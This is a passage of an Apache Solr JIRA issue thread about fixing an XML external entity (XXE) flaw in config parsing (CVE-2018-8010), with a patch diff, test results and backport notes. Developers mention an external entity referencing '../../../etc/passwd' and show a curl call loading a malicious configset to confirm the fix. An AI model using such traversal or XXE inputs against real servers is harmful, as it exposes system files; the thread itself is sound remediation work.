&lt;pre class=&quot;code-java&quot;&gt;
diff --git a/solr/core/src/java/org/apache/solr/core/Config.java b/solr/core/src/java/org/apache/solr/core/Config.java
index 11a381e393..c2f6b40936 100644
--- a/solr/core/src/java/org/apache/solr/core/Config.java
+++ b/solr/core/src/java/org/apache/solr/core/Config.java
@@ -45,6 +45,7 @@ &lt;span class=&quot;code-keyword&quot;&gt;import&lt;/span&gt; java.util.TreeSet;
 &lt;span class=&quot;code-keyword&quot;&gt;import&lt;/span&gt; java.util.concurrent.atomic.AtomicBoolean;
 
 &lt;span class=&quot;code-keyword&quot;&gt;import&lt;/span&gt; org.apache.commons.io.IOUtils;
+&lt;span class=&quot;code-keyword&quot;&gt;import&lt;/span&gt; org.apache.solr.common.EmptyEntityResolver;
 &lt;span class=&quot;code-keyword&quot;&gt;import&lt;/span&gt; org.apache.lucene.util.Version;
 &lt;span class=&quot;code-keyword&quot;&gt;import&lt;/span&gt; org.apache.solr.cloud.ZkSolrResourceLoader;
 &lt;span class=&quot;code-keyword&quot;&gt;import&lt;/span&gt; org.apache.solr.common.SolrException;
@@ -137,7 +138,7 @@ &lt;span class=&quot;code-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;code-keyword&quot;&gt;class &lt;/span&gt;Config {
       }
       
       &lt;span class=&quot;code-keyword&quot;&gt;final&lt;/span&gt; DocumentBuilder db = dbf.newDocumentBuilder();
-      db.setEntityResolver(&lt;span class=&quot;code-keyword&quot;&gt;new&lt;/span&gt; SystemIdResolver(loader));
+      db.setEntityResolver(EmptyEntityResolver.SAX_INSTANCE);
       db.setErrorHandler(xmllog);
       &lt;span class=&quot;code-keyword&quot;&gt;try&lt;/span&gt; {
         doc = db.parse(is);
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&#160;&lt;br/&gt;
&lt;span class=&quot;error&quot;&gt;&amp;#91;1&amp;#93;&lt;/span&gt; - &lt;/p&gt;</comment>
                            <comment id="16465056" author="thetaphi" created="Sun, 6 May 2018 09:55:31 +0000"  >&lt;p&gt;The issue is found. The systemidresolver was allowing other url protocols. It only prevented relative paths to not escape. So you were able to circumvent solrrsourceloader.&lt;/p&gt;</comment>
                            <comment id="16465057" author="ichattopadhyaya" created="Sun, 6 May 2018 09:56:51 +0000"  >&lt;blockquote&gt;&lt;p&gt;I just repeat: The correct way to fix all issues we have seen the last time is very simple: LET&apos;S RUN SOLR INSIDE A SECURITY MANAGER IN PRODUCTION (like in tests). Elasticsearch is doing this, so please please let&apos;s do this instead. But this requires to finally get rid of the webapplication and start.jar and add our own bootstrapping (like in tests) that configure Jetty and Security Manager from our own org.apache.solr.bootstrap.Main.java (or similar).&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Is there a JIRA for this?&lt;/p&gt;</comment>
                            <comment id="16465061" author="thetaphi" created="Sun, 6 May 2018 10:19:39 +0000"  >&lt;blockquote&gt;&lt;p&gt;Is there a JIRA for this?&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I will look it up. I will post a simple patch in a minute, could you try it. I am on Windows at the moment, so assistance with Linux/Mac would be good &lt;img class=&quot;emoticon&quot; src=&quot;https://issues.apache.org/jira/images/icons/emoticons/smile.png&quot; height=&quot;16&quot; width=&quot;16&quot; align=&quot;absmiddle&quot; alt=&quot;&quot; border=&quot;0&quot;/&gt;&lt;/p&gt;</comment>
                            <comment id="16465062" author="ichattopadhyaya" created="Sun, 6 May 2018 10:22:12 +0000"  >&lt;blockquote&gt;&lt;p&gt;I will look it up. I will post a simple patch in a minute, could you try it. I am on Windows at the moment, so assistance with Linux/Mac would be good &lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Sure thing!&lt;/p&gt;</comment>
                            <comment id="16465064" author="thetaphi" created="Sun, 6 May 2018 10:27:46 +0000"  >&lt;p&gt;In the meantime your could try one thing: Change your external entity to not use &quot;file:...&quot;. Instead use something like &quot;../../../etc/passwd&quot;. This should cause an Exception. The patch is coming after some testing.&lt;/p&gt;</comment>
                            <comment id="16465068" author="thetaphi" created="Sun, 6 May 2018 10:36:59 +0000"  >&lt;p&gt;Hi &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=ichattopadhyaya&quot; class=&quot;user-hover&quot; rel=&quot;ichattopadhyaya&quot;&gt;ichattopadhyaya&lt;/a&gt;: Here is a patch fixning the issue. This was legacy at the time where we thought, that absolute URIs should still be supported (e.g. loading config files from HTTP). This now throws an Exception whenever a systemId is not relative and inside our solr home:  &lt;span class=&quot;nobr&quot;&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/attachment/12922176/12922176_SOLR-12316.patch&quot; title=&quot;SOLR-12316.patch attached to SOLR-12316&quot;&gt;SOLR-12316.patch&lt;sup&gt;&lt;img class=&quot;rendericon&quot; src=&quot;https://issues.apache.org/jira/images/icons/link_attachment_7.gif&quot; height=&quot;7&quot; width=&quot;7&quot; align=&quot;absmiddle&quot; alt=&quot;&quot; border=&quot;0&quot;/&gt;&lt;/sup&gt;&lt;/a&gt;&lt;/span&gt; &lt;/p&gt;</comment>
                            <comment id="16465069" author="ichattopadhyaya" created="Sun, 6 May 2018 10:41:47 +0000"  >&lt;blockquote&gt;&lt;p&gt;In the meantime your could try one thing: Change your external entity to not use &quot;file:...&quot;. Instead use something like &quot;../../../etc/passwd&quot;. This should cause an Exception. The patch is coming after some testing.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Looks good.&lt;/p&gt;

&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
[ishan@x260 solr] $ curl &lt;span class=&quot;code-quote&quot;&gt;&quot;http:&lt;span class=&quot;code-comment&quot;&gt;//localhost:8983/solr/admin/collections?action=CREATE&amp;amp;name=mybadcoll&amp;amp;numShards=1&amp;amp;collection.configName=mybadconfigset&quot;&lt;/span&gt;
&lt;/span&gt;{
  &lt;span class=&quot;code-quote&quot;&gt;&quot;responseHeader&quot;&lt;/span&gt;:{
    &lt;span class=&quot;code-quote&quot;&gt;&quot;status&quot;&lt;/span&gt;:0,
    &lt;span class=&quot;code-quote&quot;&gt;&quot;QTime&quot;&lt;/span&gt;:32135},
  &lt;span class=&quot;code-quote&quot;&gt;&quot;failure&quot;&lt;/span&gt;:{
    &lt;span class=&quot;code-quote&quot;&gt;&quot;192.168.1.6:8983_solr&quot;&lt;/span&gt;:&lt;span class=&quot;code-quote&quot;&gt;&quot;org.apache.solr.client.solrj.impl.HttpSolrClient$RemoteSolrException:Error from server at http:&lt;span class=&quot;code-comment&quot;&gt;//192.168.1.6:8983/solr: Error CREATEing SolrCore &lt;span class=&quot;code-quote&quot;&gt;&apos;mybadcoll_shard1_replica_n1&apos;&lt;/span&gt;: Unable to create core [mybadcoll_shard1_replica_n1] Caused by: Invalid path string \&quot;&lt;/span&gt;/configs/mybadconfigset/../../../../../etc/passwd\&lt;span class=&quot;code-quote&quot;&gt;&quot; caused by relative paths not allowed @25&quot;&lt;/span&gt;}}&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I&apos;ll take try out the patch next.&lt;/p&gt;</comment>
                            <comment id="16465072" author="thetaphi" created="Sun, 6 May 2018 10:42:38 +0000"  >&lt;p&gt;Tests are still running, no failures yet.&lt;/p&gt;</comment>
                            <comment id="16465073" author="thetaphi" created="Sun, 6 May 2018 10:45:35 +0000"  >&lt;blockquote&gt;&lt;p&gt;Simply setting the entity resolver to EmptyEntityResolver.SAX_INSTANCE resulted in tons of test failures (perhaps all tests failed)&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;There are some tests and example configs that use xinclude, because it is an &quot;official&quot; supported way to include other files. The bug was in the resolver. So test failures are expected.&lt;/p&gt;</comment>
                            <comment id="16465074" author="thetaphi" created="Sun, 6 May 2018 10:51:28 +0000"  >&lt;p&gt;There is one test failing, but the attached patch should verify that we fixed the issue reported here.&lt;/p&gt;</comment>
                            <comment id="16465075" author="ichattopadhyaya" created="Sun, 6 May 2018 10:59:48 +0000"  >&lt;blockquote&gt;&lt;p&gt;Hi Ishan Chattopadhyaya: Here is a patch fixning the issue. This was legacy at the time where we thought, that absolute URIs should still be supported (e.g. loading config files from HTTP). This now throws an Exception whenever a systemId is not relative and inside our solr home: &lt;a href=&quot;https://issues.apache.org/jira/browse/SOLR-12316&quot; title=&quot;CVE-2018-8010: Prevent XXE in solrconfig.xml and managed-schema(.xml)&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SOLR-12316&quot;&gt;&lt;del&gt;SOLR-12316&lt;/del&gt;&lt;/a&gt;.patch&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I can confirm that this patch works well; throws an exception. Both for solrconfig.xml and managed-schema/schema.xml. I&apos;m on GNU/Linux.&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;This was legacy at the time where we thought, that absolute URIs should still be supported (e.g. loading config files from HTTP).&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Scary &lt;img class=&quot;emoticon&quot; src=&quot;https://issues.apache.org/jira/images/icons/emoticons/smile.png&quot; height=&quot;16&quot; width=&quot;16&quot; align=&quot;absmiddle&quot; alt=&quot;&quot; border=&quot;0&quot;/&gt;&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;There is one test failing, but the attached patch should verify that we fixed the issue reported here.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;TestSystemIdResolver failed for me. Also, IndexSizeTriggerTest and TestTriggerIntegration failed, but all other tests passed for me with your patch.&lt;/p&gt;</comment>
                            <comment id="16465076" author="thetaphi" created="Sun, 6 May 2018 11:06:47 +0000"  >&lt;p&gt;This is the patch fixing the systemid resolver test: &lt;span class=&quot;nobr&quot;&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/attachment/12922176/12922176_SOLR-12316.patch&quot; title=&quot;SOLR-12316.patch attached to SOLR-12316&quot;&gt;SOLR-12316.patch&lt;sup&gt;&lt;img class=&quot;rendericon&quot; src=&quot;https://issues.apache.org/jira/images/icons/link_attachment_7.gif&quot; height=&quot;7&quot; width=&quot;7&quot; align=&quot;absmiddle&quot; alt=&quot;&quot; border=&quot;0&quot;/&gt;&lt;/sup&gt;&lt;/a&gt;&lt;/span&gt; &lt;/p&gt;

&lt;p&gt;I have no idea about the other ones yet (IndexSizeTriggerTest and TestTriggerIntegration), maybe the usual problems, but might be related. We have to look at those.&lt;/p&gt;

&lt;p&gt;I&apos;d also like to fix EmptyEntityResolver to be more strict. Currently, EmptyEntityResolver just returns an empty InputStream for external entities. This was made to not break users. But now a few years later, we should not silently return &quot;nothing&quot; for external entities and instead throw an exception (&quot;external entities not allowed&quot;. Waht do you think?&lt;/p&gt;

&lt;p&gt;This requires some work on some tests, but should be easy to fix. I can do this in this issue or a separate one.&lt;/p&gt;</comment>
                            <comment id="16465079" author="thetaphi" created="Sun, 6 May 2018 11:14:58 +0000"  >&lt;blockquote&gt;&lt;p&gt;IndexSizeTriggerTest and TestTriggerIntegration&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;did not fail for me, so looks like usual problems with tests.&lt;/p&gt;</comment>
                            <comment id="16465080" author="thetaphi" created="Sun, 6 May 2018 11:16:11 +0000"  >&lt;p&gt;Slightly improved test: &lt;span class=&quot;nobr&quot;&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/attachment/12922176/12922176_SOLR-12316.patch&quot; title=&quot;SOLR-12316.patch attached to SOLR-12316&quot;&gt;SOLR-12316.patch&lt;sup&gt;&lt;img class=&quot;rendericon&quot; src=&quot;https://issues.apache.org/jira/images/icons/link_attachment_7.gif&quot; height=&quot;7&quot; width=&quot;7&quot; align=&quot;absmiddle&quot; alt=&quot;&quot; border=&quot;0&quot;/&gt;&lt;/sup&gt;&lt;/a&gt;&lt;/span&gt; &lt;/p&gt;</comment>
                            <comment id="16465081" author="thetaphi" created="Sun, 6 May 2018 11:19:51 +0000"  >&lt;blockquote&gt;
&lt;blockquote&gt;&lt;p&gt;This was legacy at the time where we thought, that absolute URIs should still be supported (e.g. loading config files from HTTP).&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Scary &lt;img class=&quot;emoticon&quot; src=&quot;https://issues.apache.org/jira/images/icons/emoticons/smile.png&quot; height=&quot;16&quot; width=&quot;16&quot; align=&quot;absmiddle&quot; alt=&quot;&quot; border=&quot;0&quot;/&gt;&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I owe you a beer! When I did this a few years ago, there was already the risk of XXE, but i wanted to start soft an not break everybody. At this time we also had no possibility to upload config files through HTTP, so config files should have been hand-edited on local filesystem... Now that&apos;s different.&lt;/p&gt;

&lt;p&gt;This is also the reason why EmptyEntityResover silently just returns &quot;nothing&quot; to prevent XXE, but in fact it should be noisy and fail the request (see above).&lt;/p&gt;</comment>
                            <comment id="16465082" author="ichattopadhyaya" created="Sun, 6 May 2018 11:23:34 +0000"  >&lt;blockquote&gt;&lt;p&gt;I&apos;d also like to fix EmptyEntityResolver to be more strict. Currently, EmptyEntityResolver just returns an empty InputStream for external entities. This was made to not break users. But now a few years later, we should not silently return &quot;nothing&quot; for external entities and instead throw an exception (&quot;external entities not allowed&quot;. Waht do you think? This requires some work on some tests, but should be easy to fix. I can do this in this issue or a separate one.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;That makes sense! I don&apos;t see that as a release blocker / critical vulnerability (unless I haven&apos;t understood the full scope of implications), though, so I&apos;d have done so in another issue. But I leave it to your judgement.&lt;/p&gt;

&lt;p&gt;As for this issue, should we commit this patch now and backport to 7.3.1, 6.6 and 5.5? I can volunteer for a release for 6.6 and 5.5 bugfix releases (while Dat is working on 7.3.1).&lt;/p&gt;</comment>
                            <comment id="16465083" author="thetaphi" created="Sun, 6 May 2018 11:25:20 +0000"  >&lt;p&gt;OK, I will do this now. Should we assign the CVE for this one?&lt;/p&gt;

&lt;p&gt;I will fix EmptyEntityResolver for 7.4.&lt;/p&gt;</comment>
                            <comment id="16465084" author="ichattopadhyaya" created="Sun, 6 May 2018 11:27:49 +0000"  >&lt;blockquote&gt;&lt;p&gt;OK, I will do this now. Should we assign the CVE for this one?&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;I&apos;ve already applied for one at Mitre. I got an email saying:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
Subject: CVE Request 503028 &lt;span class=&quot;code-keyword&quot;&gt;for&lt;/span&gt; CVE ID Request

Thank you &lt;span class=&quot;code-keyword&quot;&gt;for&lt;/span&gt; your submission. It will be reviewed by a CVE Assignment Team member.

Changes, additions, or updates to your request can be sent to the CVE Team by replying directly to &lt;span class=&quot;code-keyword&quot;&gt;this&lt;/span&gt; email.

Please &lt;span class=&quot;code-keyword&quot;&gt;do&lt;/span&gt; not change the subject line, which allows us to effectively track your request.

CVE Assignment Team 
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Is that sufficient?&lt;/p&gt;</comment>
                            <comment id="16465087" author="thetaphi" created="Sun, 6 May 2018 11:34:08 +0000"  >&lt;p&gt;The CVE number should be requested through Apache Security team not on your own.&lt;/p&gt;</comment>
                            <comment id="16465088" author="thetaphi" created="Sun, 6 May 2018 11:34:45 +0000"  >&lt;p&gt;Here is my final patch for SystemIdResolver with some more tests: &lt;span class=&quot;nobr&quot;&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/attachment/12922176/12922176_SOLR-12316.patch&quot; title=&quot;SOLR-12316.patch attached to SOLR-12316&quot;&gt;SOLR-12316.patch&lt;sup&gt;&lt;img class=&quot;rendericon&quot; src=&quot;https://issues.apache.org/jira/images/icons/link_attachment_7.gif&quot; height=&quot;7&quot; width=&quot;7&quot; align=&quot;absmiddle&quot; alt=&quot;&quot; border=&quot;0&quot;/&gt;&lt;/sup&gt;&lt;/a&gt;&lt;/span&gt; &lt;/p&gt;</comment>
                            <comment id="16465089" author="thetaphi" created="Sun, 6 May 2018 11:35:55 +0000"  >&lt;p&gt;I would have been used CVE-2018-8010 for this issue.&lt;/p&gt;</comment>
                            <comment id="16465090" author="ichattopadhyaya" created="Sun, 6 May 2018 11:39:42 +0000"  >&lt;blockquote&gt;&lt;p&gt;The CVE number should be requested through Apache Security team not on your own.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Oh, I see. &lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;I would have been used CVE-2018-8010 for this issue.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Can you please update the title with the CVE id and the correct title (instead of the vague one that I used)?&lt;/p&gt;</comment>
                            <comment id="16465092" author="thetaphi" created="Sun, 6 May 2018 11:44:37 +0000"  >&lt;p&gt;The CVE is only reserved, it does not yet have a title. Once we have a fixed version out, then we inform CVE about details. Otherwise it get&apos;s public too early.&lt;/p&gt;

&lt;p&gt;See the instructions @ &lt;a href=&quot;https://www.apache.org/security/committers.html&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://www.apache.org/security/committers.html&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="16465093" author="thetaphi" created="Sun, 6 May 2018 11:47:41 +0000"  >&lt;blockquote&gt;&lt;p&gt;As for this issue, should we commit this patch now and backport to 7.3.1, 6.6 and 5.5? I can volunteer for a release for 6.6 and 5.5 bugfix releases (while Dat is working on 7.3.1).&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I will commit this now to Master and 7.x and wait a few hours for Jenkins. In the evening Europe times, I will backport to 7.3.1.&lt;/p&gt;</comment>
                            <comment id="16465095" author="thetaphi" created="Sun, 6 May 2018 11:53:22 +0000"  >&lt;p&gt;I will use this changes.txt:&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;* SOLR-12316: Do not allow to use absolute URIs for including other files in solrconfig.xml and schema parsing.
  (Ishan Chattopadhyaya, Uwe Schindler)
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</comment>
                            <comment id="16465101" author="ichattopadhyaya" created="Sun, 6 May 2018 12:04:47 +0000"  >&lt;blockquote&gt;&lt;p&gt;I will use this changes.txt:&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;I&apos;d request that we include Ananthesh &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=antz&quot; class=&quot;user-hover&quot; rel=&quot;antz&quot;&gt;antz&lt;/a&gt;&apos;s name as well, who helped me discover this issue in the first place.&lt;/p&gt;</comment>
                            <comment id="16465103" author="thetaphi" created="Sun, 6 May 2018 12:20:26 +0000"  >&lt;p&gt;OK.&lt;/p&gt;</comment>
                            <comment id="16465104" author="thetaphi" created="Sun, 6 May 2018 12:26:09 +0000"  >&lt;p&gt;I committed this to Master and 7.x. Let&apos;s Jenkins work for a while and then I backport.&lt;/p&gt;</comment>
                            <comment id="16465125" author="thetaphi" created="Sun, 6 May 2018 13:32:35 +0000"  >&lt;p&gt;Sorry i f*cked up the test, as it by default allowed unsafe resource loading. Will fix.&lt;/p&gt;

&lt;p&gt;Unfortunately you have to backport 2 commits... HMPF.&lt;/p&gt;</comment>
                            <comment id="16465134" author="thetaphi" created="Sun, 6 May 2018 13:49:33 +0000"  >&lt;p&gt;OK test fix attached - it&apos;s better now, it tests both Windows and Linux:  &lt;span class=&quot;nobr&quot;&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/attachment/12922184/12922184_SOLR-12316-testfix.patch&quot; title=&quot;SOLR-12316-testfix.patch attached to SOLR-12316&quot;&gt;SOLR-12316-testfix.patch&lt;sup&gt;&lt;img class=&quot;rendericon&quot; src=&quot;https://issues.apache.org/jira/images/icons/link_attachment_7.gif&quot; height=&quot;7&quot; width=&quot;7&quot; align=&quot;absmiddle&quot; alt=&quot;&quot; border=&quot;0&quot;/&gt;&lt;/sup&gt;&lt;/a&gt;&lt;/span&gt; &lt;/p&gt;</comment>
                            <comment id="16465135" author="ichattopadhyaya" created="Sun, 6 May 2018 13:50:37 +0000"  >&lt;p&gt;No worries, Uwe. I&apos;ll do the needful.&lt;/p&gt;</comment>
                            <comment id="16465256" author="thetaphi" created="Sun, 6 May 2018 19:11:01 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=ichattopadhyaya&quot; class=&quot;user-hover&quot; rel=&quot;ichattopadhyaya&quot;&gt;ichattopadhyaya&lt;/a&gt; merged it to 7.3 branch.&lt;/p&gt;</comment>
                            <comment id="16467886" author="ctargett" created="Tue, 8 May 2018 19:56:47 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=ichattopadhyaya&quot; class=&quot;user-hover&quot; rel=&quot;ichattopadhyaya&quot;&gt;ichattopadhyaya&lt;/a&gt;, are you also planning to backport this to branch_6_6 and do a 6.6.4?&lt;/p&gt;</comment>
                            <comment id="16467899" author="ichattopadhyaya" created="Tue, 8 May 2018 20:03:09 +0000"  >&lt;p&gt;Yes, &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=ctargett&quot; class=&quot;user-hover&quot; rel=&quot;ctargett&quot;&gt;ctargett&lt;/a&gt;. I&apos;ll do that tomorrow.&lt;/p&gt;</comment>
                            <comment id="16469795" author="ichattopadhyaya" created="Thu, 10 May 2018 01:23:39 +0000"  >&lt;p&gt;I&apos;ve backported this to branch_6x and branch_6_6.&lt;/p&gt;</comment>
                            <comment id="16475248" author="caomanhdat" created="Tue, 15 May 2018 03:18:33 +0000"  >&lt;p&gt;Fixed for 7.3.1 release&lt;/p&gt;</comment>
                            <comment id="16482419" author="thetaphi" created="Mon, 21 May 2018 11:41:51 +0000"  >&lt;p&gt;Fixed for 6.6.4 release.&lt;/p&gt;</comment>
                            <comment id="16482425" author="jira-bot" created="Mon, 21 May 2018 11:55:58 +0000"  >&lt;p&gt;Commit 63e213916cd99490973c0473d1969bd5dcd7edd8 in lucene-solr&apos;s branch refs/heads/master from &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=thetaphi&quot; class=&quot;user-hover&quot; rel=&quot;thetaphi&quot;&gt;thetaphi&lt;/a&gt;&lt;br/&gt;
[ &lt;a href=&quot;https://git-wip-us.apache.org/repos/asf?p=lucene-solr.git;h=63e2139&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://git-wip-us.apache.org/repos/asf?p=lucene-solr.git;h=63e2139&lt;/a&gt; ]&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/browse/SOLR-12316&quot; title=&quot;CVE-2018-8010: Prevent XXE in solrconfig.xml and managed-schema(.xml)&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SOLR-12316&quot;&gt;&lt;del&gt;SOLR-12316&lt;/del&gt;&lt;/a&gt;: Make CVE public&lt;/p&gt;</comment>
                            <comment id="16482426" author="jira-bot" created="Mon, 21 May 2018 11:58:23 +0000"  >&lt;p&gt;Commit f08c6b1ef149b4a7ca63c68c9fde3ccb14d39e6a in lucene-solr&apos;s branch refs/heads/branch_7x from &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=thetaphi&quot; class=&quot;user-hover&quot; rel=&quot;thetaphi&quot;&gt;thetaphi&lt;/a&gt;&lt;br/&gt;
[ &lt;a href=&quot;https://git-wip-us.apache.org/repos/asf?p=lucene-solr.git;h=f08c6b1&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://git-wip-us.apache.org/repos/asf?p=lucene-solr.git;h=f08c6b1&lt;/a&gt; ]&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/browse/SOLR-12316&quot; title=&quot;CVE-2018-8010: Prevent XXE in solrconfig.xml and managed-schema(.xml)&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SOLR-12316&quot;&gt;&lt;del&gt;SOLR-12316&lt;/del&gt;&lt;/a&gt;: Make CVE public&lt;/p&gt;

&lt;ol&gt;
	&lt;li&gt;Conflicts:&lt;/li&gt;
	&lt;li&gt;solr/CHANGES.txt&lt;/li&gt;
&lt;/ol&gt;
</comment>
                            <comment id="16482428" author="jira-bot" created="Mon, 21 May 2018 11:59:35 +0000"  >&lt;p&gt;Commit 6bb88bb2861e2fb512d1da9831afbc29acba7a1b in lucene-solr&apos;s branch refs/heads/branch_7_3 from &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=thetaphi&quot; class=&quot;user-hover&quot; rel=&quot;thetaphi&quot;&gt;thetaphi&lt;/a&gt;&lt;br/&gt;
[ &lt;a href=&quot;https://git-wip-us.apache.org/repos/asf?p=lucene-solr.git;h=6bb88bb&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://git-wip-us.apache.org/repos/asf?p=lucene-solr.git;h=6bb88bb&lt;/a&gt; ]&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/browse/SOLR-12316&quot; title=&quot;CVE-2018-8010: Prevent XXE in solrconfig.xml and managed-schema(.xml)&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SOLR-12316&quot;&gt;&lt;del&gt;SOLR-12316&lt;/del&gt;&lt;/a&gt;: Make CVE public&lt;/p&gt;

&lt;ol&gt;
	&lt;li&gt;Conflicts:&lt;/li&gt;
	&lt;li&gt;solr/CHANGES.txt&lt;/li&gt;
&lt;/ol&gt;
</comment>
                            <comment id="16482430" author="jira-bot" created="Mon, 21 May 2018 12:01:59 +0000"  >&lt;p&gt;Commit 3940e6a930bbf245b23a728d1917f850c9f6ae3e in lucene-solr&apos;s branch refs/heads/branch_6_6 from &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=thetaphi&quot; class=&quot;user-hover&quot; rel=&quot;thetaphi&quot;&gt;thetaphi&lt;/a&gt;&lt;br/&gt;
[ &lt;a href=&quot;https://git-wip-us.apache.org/repos/asf?p=lucene-solr.git;h=3940e6a&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://git-wip-us.apache.org/repos/asf?p=lucene-solr.git;h=3940e6a&lt;/a&gt; ]&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/browse/SOLR-12316&quot; title=&quot;CVE-2018-8010: Prevent XXE in solrconfig.xml and managed-schema(.xml)&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SOLR-12316&quot;&gt;&lt;del&gt;SOLR-12316&lt;/del&gt;&lt;/a&gt;: Make CVE public&lt;/p&gt;

&lt;ol&gt;
	&lt;li&gt;Conflicts:&lt;/li&gt;
	&lt;li&gt;solr/CHANGES.txt&lt;/li&gt;
&lt;/ol&gt;


&lt;ol&gt;
	&lt;li&gt;Conflicts:&lt;/li&gt;
	&lt;li&gt;solr/CHANGES.txt&lt;/li&gt;
&lt;/ol&gt;
</comment>
                            <comment id="16482538" author="noble.paul" created="Mon, 21 May 2018 14:15:48 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=ichattopadhyaya&quot; class=&quot;user-hover&quot; rel=&quot;ichattopadhyaya&quot;&gt;ichattopadhyaya&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;Just to clarify. Didn&apos;t we disable resolving external file reference if the configset is loaded using the REST API ?&lt;/p&gt;</comment>
                            <comment id="16482613" author="thetaphi" created="Mon, 21 May 2018 15:18:44 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=noble.paul&quot; class=&quot;user-hover&quot; rel=&quot;noble.paul&quot;&gt;noble.paul&lt;/a&gt;: This bug fixes the check in the Config file parser.&lt;/p&gt;</comment>
                            <comment id="16482622" author="thetaphi" created="Mon, 21 May 2018 15:26:01 +0000"  >&lt;p&gt;In addition, there are several ways to upload files, e.g. through the admin interface.&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                            <attachment id="12922184" name="SOLR-12316-testfix.patch" size="3428" author="uschindler" created="Sun, 6 May 2018 13:47:59 +0000"/>
                            <attachment id="12922176" name="SOLR-12316.patch" size="4445" author="uschindler" created="Sun, 6 May 2018 11:34:20 +0000"/>
                            <attachment id="12922174" name="SOLR-12316.patch" size="3907" author="uschindler" created="Sun, 6 May 2018 11:16:01 +0000"/>
                            <attachment id="12922173" name="SOLR-12316.patch" size="3808" author="uschindler" created="Sun, 6 May 2018 11:03:44 +0000"/>
                            <attachment id="12922172" name="SOLR-12316.patch" size="2436" author="uschindler" created="Sun, 6 May 2018 10:35:38 +0000"/>
                            <attachment id="12922167" name="SOLR-12316.patch" size="1395" author="ichattopadhyaya" created="Sun, 6 May 2018 08:20:44 +0000"/>
                            <attachment id="12922168" name="solr.log" size="13837" author="ichattopadhyaya" created="Sun, 6 May 2018 08:52:52 +0000"/>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>7.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
